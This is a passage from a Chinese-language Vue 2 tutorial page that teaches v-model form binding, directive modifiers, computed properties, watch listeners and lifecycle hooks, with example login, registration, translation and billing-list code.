class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;password&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;login&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;reset&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">username</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">password</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      login () &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">username</span>, <span class="variable language_">this</span>.<span class="property">password</span>)</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      reset () &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">username</span> = <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">password</span> = <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-model应用于其他表单元素"><a href="#v-model应用于其他表单元素" class="headerlink" title="v-model应用于其他表单元素"></a>v-model应用于其他表单元素</h3><p>常见的表单元素都可以用v-model绑定关联 -&gt; 快速<strong>获取</strong>或<strong>设置</strong>表单元素的值</p><ul><li>输入框：input:text</li><li>文本域：textarea</li><li>复选框：input:checkbox</li><li>单选框：input:radio</li><li>下拉菜单：select</li><li>…</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">textarea</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">240px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>小黑学习网<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    姓名：</span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;username&quot;</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    是否单身：</span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;isSingle&quot;</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">      前置理解：</span></span><br><span class="line"><span class="comment">        1. name:  给单选框加上 name 属性 可以分组 → 同一组互相会互斥</span></span><br><span class="line"><span class="comment">        2. value: 给单选框加上 value 属性，用于提交给后台的数据</span></span><br><span class="line"><span class="comment">      结合 Vue 使用 → v-model</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    性别: </span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>男</span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>女</span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">      前置理解：</span></span><br><span class="line"><span class="comment">        1. option 需要设置 value 值，提交给后台</span></span><br><span class="line"><span class="comment">        2. select 的 value 值，关联了选中的 option 的 value 值</span></span><br><span class="line"><span class="comment">      结合 Vue 使用 → v-model</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    所在城市:</span><br><span class="line">      <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">&quot;cityId&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;101&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;102&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;103&quot;</span>&gt;</span>成都<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;104&quot;</span>&gt;</span>南京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    自我描述：</span><br><span class="line">      <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">v-model</span>=<span class="string">&quot;desc&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>立即注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">username</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">isSingle</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">gender</span>: <span class="string">&quot;2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">cityId</span>: <span class="string">&#x27;102&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">desc</span>: <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="指令修饰符"><a href="#指令修饰符" class="headerlink" title="指令修饰符"></a>指令修饰符</h1><p>通过”.”指明了一些指令后缀，不同后缀封装了不同的处理操作，从而简化代码；</p><ul><li>按键修饰符：<code>@keyup.unter</code> 按键回车监听；</li><li>v-model修饰符：<ul><li><code>v-model.trim</code> 去除首尾空格；</li><li><code>v-model.number</code>转数字；</li></ul></li><li>事件修饰符：<ul><li><code>事件名.stop</code>阻止冒泡；</li><li><code>事件名.prevent</code>阻止默认行为。</li></ul></li></ul><h1 id="计算属性data-computed"><a href="#计算属性data-computed" class="headerlink" title="计算属性data: computed: {}"></a>计算属性data: computed: {}</h1><blockquote><p>注意：计算属性对应的属性或对象将不在data中声明。</p></blockquote><ul><li>概念：基于现有的数据，计算出来的新属性，依赖的数据变化，自动重新计算；</li><li>语法：声明在computed配置项中，一个计算属性对应一个函数；</li><li>使用起来和普通属性一样使用 <code>&#123;&#123; 计算属性名 &#125;&#125;</code></li></ul><blockquote><p>computed计算属性和methods方法的区别：</p><p>computed计算属性：</p><ul><li>作用：封装了一段对于数据的处理，求得一个结果；</li><li>缓存特性：计算树形会对计算出来的结果缓存，再次使用直接读取缓存；</li></ul><p>methods方法：</p><ul><li>作用：给实例提供一个方法，调用以处理业务逻辑；</li></ul></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span> +</span><br><span class="line">  名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span> =</span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; fullName &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeName&quot;</span>&gt;</span>改名卡<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">firstName</span>: <span class="string">&#x27;刘&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">lastName</span>: <span class="string">&#x27;备&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      changeName () &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">fullName</span> = <span class="string">&#x27;黄忠&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 简写 → 获取，没有配置设置的逻辑</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// fullName () &#123;</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//   return this.firstName + this.lastName</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 完整写法 → 获取 + 设置</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">fullName</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// (1) 当fullName计算属性，被获取求值时，执行get（有缓存，优先读缓存）</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//     会将返回值作为，求值的结果</span></span></span><br><span class="line"><span class="language-javascript">        get () &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// (2) 当fullName计算属性，被修改赋值时，执行set</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//     修改的值，传递给set方法的形参</span></span></span><br><span class="line"><span class="language-javascript">        set (value) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// console.log(value.slice(0, 1))          </span></span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// console.log(value.slice(1))         </span></span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">firstName</span> = value.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">lastName</span> = value.<span class="title function_">slice</span>(<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="watch侦听器（监视器）"><a href="#watch侦听器（监视器）" class="headerlink" title="watch侦听器（监视器）"></a>watch侦听器（监视器）</h1><ul><li><p>作用：监视数据变化，执行一些业务逻辑 或 异步操作；</p></li><li><p>语法：</p><ul><li><p>简单写法：简单类型数据，直接监视；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line">数据属性名 (newValue, oldValue) &#123;</span><br><span class="line">某些业务逻辑 或 异步操作;</span><br><span class="line">&#125;,</span><br><span class="line">&#x27;对象.属性名&#x27; (newValue, oldValue) &#123;</span><br><span class="line">某些业务逻辑 或 异步操作;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>完整写法：添加额外配置项。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line">数据属性名: &#123;</span><br><span class="line">deep: true, //深度监视（监视对象中的每一个属性） </span><br><span class="line">immediate: true, //是否立刻执行一次handler</span><br><span class="line">handler (newValue) &#123;</span><br><span class="line">console.log(newValue)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">const app = new Vue(&#123;</span><br><span class="line">  el: &#x27;#app&#x27;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    obj: &#123;</span><br><span class="line">      words: &#x27;小黑&#x27;,</span><br><span class="line">      lang: &#x27;italy&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    result: &#x27;&#x27;, // 翻译结果</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    obj: &#123;</span><br><span class="line">      deep: true, // 深度监视</span><br><span class="line">      immediate: true, // 立刻执行，一进入页面handler就立刻执行一次</span><br><span class="line">      handler (newValue) &#123;</span><br><span class="line">        clearTimeout(this.timer)</span><br><span class="line">        this.timer = setTimeout(async () =&gt; &#123;</span><br><span class="line">          const res = await axios(&#123;</span><br><span class="line">            url: &#x27;https://applet-base-api-t.itheima.net/api/translate&#x27;,</span><br><span class="line">            params: newValue</span><br><span class="line">          &#125;)</span><br><span class="line">          this.result = res.data.data</span><br><span class="line">          console.log(res.data.data)</span><br><span class="line">        &#125;, 300)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​</p><h1 id="Vue生命周期"><a href="#Vue生命周期" class="headerlink" title="Vue生命周期"></a>Vue生命周期</h1><p>Vue生命周期是指，一个Vue实例从 创建 到 销毁 的整个过程。</p><p>生命周期四个阶段：</p><ul><li>创建：Vue框架将静态数据修改为响应式数据，完成后就可以发送初始化渲染请求；</li><li>挂载：将数据挂载到模板中，再进行模板渲染，完成后就可以对dom进行操作了；</li><li>更新：更新阶段是个循环阶段，一旦数据发生修改，就进行视图的更新；</li><li>销毁：销毁实例。</li></ul><h2 id="Vue生命周期函数（钩子函数）"><a href="#Vue生命周期函数（钩子函数）" class="headerlink" title="Vue生命周期函数（钩子函数）"></a>Vue生命周期函数（钩子函数）</h2><p>Vue生命周期过程中，会自动运行一些函数，被称为【生命周期钩子】；</p><p>生命周期钩子可以让开发者在特定阶段运行自己的代码；</p><p><img src="/2023/12/28/Vue/image-20231231001137602.png" alt="image-20231231001137602"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 接口文档地址：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * https://www.apifox.cn/apidoc/shared-24459455-ebb1-4fdc-8df8-0aff8dc317a8/api-53371058</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 功能需求：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 1. 基本渲染</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 2. 添加功能</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 3. 删除功能</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 4. 饼图渲染</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   */</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">shoppingName</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">shoppingPrice</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">list</span>: []</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 计算属性，计算并返回账单总价</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">totalCount</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, item</span>) =&gt;</span> sum + item.<span class="property">price</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// created 钩子在 Vue 实例被创建后调用，但是在挂载到 DOM 之前。</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 常用于初始化设置，比如从 API 获取数据。</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">created</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="title function_">getList</span>(); <span class="comment">// 在实例创建后调用 getList 方法。</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// ... 其他方法 ...</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 从 API 获取账单数据的异步方法</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">async</span> <span class="title function_">getList</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> res = <span 